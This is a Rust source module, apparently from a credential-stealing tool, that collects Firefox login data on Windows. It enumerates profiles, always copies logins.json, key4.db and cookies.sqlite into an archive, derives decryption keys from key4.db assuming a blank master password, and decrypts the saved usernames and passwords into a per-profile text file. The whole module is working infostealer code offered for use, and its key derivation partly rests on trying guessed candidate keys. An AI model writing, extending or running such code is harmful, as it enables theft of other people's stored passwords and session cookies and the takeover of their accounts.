//! Firefox credential extraction.
//!
//! Firefox stores logins in `logins.json` encrypted with AES-CBC under a master
//! key kept in `key4.db` (an NSS key database). With an empty master password
//! the key is derived from the NSS global salt through the PKCS#12 KDF.
//!
//! The exact key material differs between Firefox releases, so the derivation
//! produces a small set of candidate keys and the first one that decrypts a
//! login field to valid text wins. Raw `logins.json`, `key4.db` and
//! `cookies.sqlite` are archived regardless, so nothing is lost if a profile
//! uses a master password or a layout we do not model.

use std::fs;
use std::path::{Path, PathBuf};

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine as _;
use cbc::cipher::block_padding::Pkcs7;
use cbc::cipher::{BlockDecryptMut, KeyIvInit};
use sha1::{Digest, Sha1};

use crate::session::Session;
use crate::util;

pub fn profiles() -> Vec<PathBuf> {
    let mut out = Vec::new();
    let Some(appdata) = util::env_path("APPDATA") else {
        return out;
    };
    let base = appdata.join(r"Mozilla\Firefox\Profiles");
    if let Ok(entries) = fs::read_dir(&base) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() && path.join("logins.json").is_file() {
                out.push(path);
            }
        }
    }
    out
}

// ---------------------------------------------------------------- DER reader

struct Der<'a> {
    data: &'a [u8],
    pos: usize,
}

impl<'a> Der<'a> {
    fn new(data: &'a [u8]) -> Self {
        Der { data, pos: 0 }
    }

    fn read(&mut self) -> Option<(u8, &'a [u8])> {
        let tag = *self.data.get(self.pos)?;
        self.pos += 1;
        let first = *self.data.get(self.pos)? as usize;
        self.pos += 1;
        let len = if first & 0x80 != 0 {
            let count = first & 0x7f;
            if count == 0 || count > 4 {
                return None;
            }
            let mut value = 0usize;
            for _ in 0..count {
                value = (value << 8) | *self.data.get(self.pos)? as usize;
                self.pos += 1;
            }
            value
        } else {
            first
        };
        let body = self.data.get(self.pos..self.pos + len)?;
        self.pos += len;
        Some((tag, body))
    }
}

fn collect_octets(data: &[u8], depth: usize, out: &mut Vec<Vec<u8>>) {
    if depth > 8 {
        return;
    }
    let mut der = Der::new(data);
    while let Some((tag, body)) = der.read() {
        if tag == 0x04 {
            out.push(body.to_vec());
        }
        if tag == 0x30 {
            collect_octets(body, depth + 1, out);
        }
    }
}

fn global_salt(item1: &[u8]) -> Option<Vec<u8>> {
    let mut outer = Der::new(item1);
    if let Some((0x30, body)) = outer.read() {
        let mut seq = Der::new(body);
        if let Some((0x30, inner)) = seq.read() {
            let mut fields = Der::new(inner);
            let _version = fields.read();
            let _algorithm = fields.read();
            if let Some((0x04, salt)) = fields.read() {
                if !salt.is_empty() {
                    return Some(salt.to_vec());
                }
            }
        }
    }
    let mut all = Vec::new();
    collect_octets(item1, 0, &mut all);
    all.into_iter().find(|v| (8..=64).contains(&v.len()))
}

struct Pbe {
    salt: Vec<u8>,
    iterations: u32,
    ciphertext: Vec<u8>,
}

fn parse_pbe(blob: &[u8]) -> Option<Pbe> {
    let mut outer = Der::new(blob);
    if let Some((0x30, body)) = outer.read() {
        let mut seq = Der::new(body);
        if let (Some((0x30, alg)), Some((0x04, encrypted))) = (seq.read(), seq.read()) {
            let mut alg_fields = Der::new(alg);
            let _oid = alg_fields.read();
            if let Some((_, params)) = alg_fields.read() {
                let mut p = Der::new(params);
                let mut salt = Vec::new();
                let mut iterations = 1u32;
                if let Some((0x04, s)) = p.read() {
                    salt = s.to_vec();
                }
                if let Some((0x02, it)) = p.read() {
                    iterations = it.iter().fold(0u32, |acc, b| (acc << 8) | *b as u32).max(1);
                }
                if salt.is_empty() {
                    let mut all = Vec::new();
                    collect_octets(alg, 0, &mut all);
                    salt = all.into_iter().next().unwrap_or_default();
                }
                if !salt.is_empty() && !encrypted.is_empty() {
                    return Some(Pbe {
                        salt,
                        iterations,
                        ciphertext: encrypted.to_vec(),
                    });
                }
            }
        }
    }

    // Fallback: guess from the flat list of octet strings.
    let mut all = Vec::new();
    collect_octets(blob, 0, &mut all);
    all.sort_by_key(|v| v.len());
    let salt = all.iter().find(|v| (8..=32).contains(&v.len()))?.clone();
    let ciphertext = all.last()?.clone();
    Some(Pbe {
        salt,
        iterations: 1,
        ciphertext,
    })
}

// ------------------------------------------------------------- PKCS#12 KDF

fn pkcs12_kdf(password: &[u8], salt: &[u8], iterations: u32, id: u8, size: usize) -> Vec<u8> {
    const V: usize = 64;

    let diversifier = vec![id; V];
    let mut s = Vec::new();
    if !salt.is_empty() {
        while s.len() < V {
            s.extend_from_slice(salt);
        }
        s.truncate(V);
    }

    // Password must already be in UTF-16BE with a trailing NUL; callers pass a
    // hash digest here, which NSS treats as an opaque octet string.
    let mut p = Vec::new();
    if !password.is_empty() {
        while p.len() < V {
            p.extend_from_slice(password);
        }
        p.truncate(V);
    }

    let mut i_block = Vec::new();
    i_block.extend_from_slice(&s);
    i_block.extend_from_slice(&p);

    let mut out = Vec::new();
    let rounds = size.div_ceil(V);
    for _ in 0..rounds {
        let mut input = Vec::with_capacity(V + i_block.len());
        input.extend_from_slice(&diversifier);
        input.extend_from_slice(&i_block);

        let mut a = Sha1::digest(&input).to_vec();
        for _ in 1..iterations {
            a = Sha1::digest(&a).to_vec();
        }
        out.extend_from_slice(&a);

        if i_block.is_empty() {
            continue;
        }

        let mut b = Vec::with_capacity(V);
        while b.len() < V {
            b.extend_from_slice(&a);
        }
        b.truncate(V);

        for chunk in i_block.chunks_mut(V) {
            let mut carry = 1u16;
            for (slot, add) in chunk.iter_mut().zip(b.iter()).rev() {
                let sum = *slot as u16 + *add as u16 + carry;
                *slot = (sum & 0xff) as u8;
                carry = sum >> 8;
            }
        }
    }

    out.truncate(size);
    out
}

fn pbe_decrypt(global_salt: &[u8], master_password: &str, blob: &[u8]) -> Option<Vec<u8>> {
    let pbe = parse_pbe(blob)?;
    let mut material = global_salt.to_vec();
    material.extend_from_slice(master_password.as_bytes());
    let k1 = Sha1::digest(&material);

    let key = pkcs12_kdf(&k1, &pbe.salt, pbe.iterations, 1, 24);
    let iv = pkcs12_kdf(&k1, &pbe.salt, pbe.iterations, 2, 8);

    let mut buffer = pbe.ciphertext.clone();
    let plain = cbc::Decryptor::<des::TdesEde3>::new_from_slices(&key, &iv)
        .ok()?
        .decrypt_padded_mut::<Pkcs7>(&mut buffer)
        .ok()?;
    Some(plain.to_vec())
}

// ------------------------------------------------------------- logins.json

fn printable(text: &str) -> bool {
    !text.is_empty()
        && text
            .chars()
            .all(|c| !c.is_control() || c == '\t' || c == '\n' || c == '\r')
}

fn try_aes(keys: &[Vec<u8>], iv: &[u8], ciphertext: &[u8]) -> Option<String> {
    for key in keys {
        let mut buffer = ciphertext.to_vec();
        let plain = match key.len() {
            32 => match cbc::Decryptor::<aes::Aes256>::new_from_slices(key, iv) {
                Ok(cipher) => cipher
                    .decrypt_padded_mut::<Pkcs7>(&mut buffer)
                    .ok()
                    .map(|p| p.to_vec()),
                Err(_) => None,
            },
            24 => match cbc::Decryptor::<aes::Aes192>::new_from_slices(key, iv) {
                Ok(cipher) => cipher
                    .decrypt_padded_mut::<Pkcs7>(&mut buffer)
                    .ok()
                    .map(|p| p.to_vec()),
                Err(_) => None,
            },
            16 => match cbc::Decryptor::<aes::Aes128>::new_from_slices(key, iv) {
                Ok(cipher) => cipher
                    .decrypt_padded_mut::<Pkcs7>(&mut buffer)
                    .ok()
                    .map(|p| p.to_vec()),
                Err(_) => None,
            },
            _ => None,
        };
        if let Some(plain) = plain {
            if let Ok(text) = String::from_utf8(plain) {
                if printable(&text) {
                    return Some(text);
                }
            }
        }
    }
    None
}

fn decrypt_field(encoded: &str, keys: &[Vec<u8>]) -> Option<String> {
    let raw = B64.decode(encoded).ok()?;
    let mut outer = Der::new(&raw);
    let (0x30, body) = outer.read()? else {
        return None;
    };
    let mut seq = Der::new(body);
    let (0x04, iv) = seq.read()? else {
        return None;
    };
    let (0x04, ciphertext) = seq.read()? else {
        return None;
    };
    if iv.len() != 16 {
        return None;
    }
    try_aes(keys, iv, ciphertext)
}

fn expand(base: &[u8]) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    for size in [32usize, 24, 16] {
        let mut key = Vec::with_capacity(size);
        while key.len() < size {
            key.extend_from_slice(base);
        }
        key.truncate(size);
        out.push(key);
    }
    out
}

fn candidate_keys(key4: &Path) -> Vec<Vec<u8>> {
    let conn = match rusqlite::Connection::open_with_flags(
        key4,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    ) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let item1: Vec<u8> = match conn.query_row(
        "SELECT item1 FROM metadata WHERE id = 'password'",
        [],
        |row| row.get(0),
    ) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let Some(salt) = global_salt(&item1) else {
        return Vec::new();
    };

    let a11: Vec<u8> = match conn.query_row("SELECT a11 FROM nssPrivate LIMIT 1", [], |row| row.get(0)) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut keys = Vec::new();
    for password in ["", " "] {
        if let Some(decrypted) = pbe_decrypt(&salt, password, &a11) {
            let mut material = salt.clone();
            material.extend_from_slice(&decrypted);
            let digest = Sha1::digest(&material);
            keys.extend(expand(&digest));
            keys.extend(expand(&decrypted));
            keys.push(Sha1::digest(&decrypted).to_vec());
        }
    }
    keys
}

pub fn collect(session: &mut Session) {
    for profile in profiles() {
        let label = profile
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| String::from("profile"));
        let label = util::sanitize(&label, "profile");

        // Always archive the raw artifacts first.
        for name in ["logins.json", "key4.db", "cookies.sqlite", "key3.db", "cert9.db"] {
            let src = profile.join(name);
            if src.is_file() {
                session.copy(&src, &format!("browsers/firefox_{label}/{name}"));
            }
        }

        let key4 = profile.join("key4.db");
        let logins = profile.join("logins.json");
        if !logins.is_file() {
            continue;
        }
        let keys = candidate_keys(&key4);
        if keys.is_empty() {
            session.note(&format!("firefox {label}: no usable key4 material"));
            continue;
        }

        let Some(text) = util::read_text(&logins) else {
            continue;
        };
        let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
            continue;
        };
        let Some(entries) = json.get("logins").and_then(|v| v.as_array()) else {
            continue;
        };

        let mut rows = Vec::new();
        for entry in entries {
            let host = entry.get("hostname").and_then(|v| v.as_str()).unwrap_or_default();
            let enc_user = entry
                .get("encryptedUsername")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            let enc_pass = entry
                .get("encryptedPassword")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            if enc_user.is_empty() && enc_pass.is_empty() {
                continue;
            }
            let user = decrypt_field(enc_user, &keys).unwrap_or_default();
            let password = decrypt_field(enc_pass, &keys).unwrap_or_else(|| String::from("<undecryptable>"));
            if user.is_empty() && password == "<undecryptable>" {
                continue;
            }
            rows.push(format!("{host}\t{user}\t{password}"));
        }

        if rows.is_empty() {
            session.note(&format!("firefox {label}: {} entries, none decrypted", entries.len()));
            continue;
        }

        let mut out = format!("# firefox {label} — {}\norigin\tusername\tvalue\n", util::timestamp());
        for row in &rows {
            out.push_str(row);
            out.push('\n');
        }
        session.put_text(&format!("browsers/firefox_{label}_passwords.txt"), &out);
        session.note(&format!("firefox {label}: {} passwords", rows.len()));
        session.line(&format!("firefox {label} passwords: {}", rows.len()));
    }
}
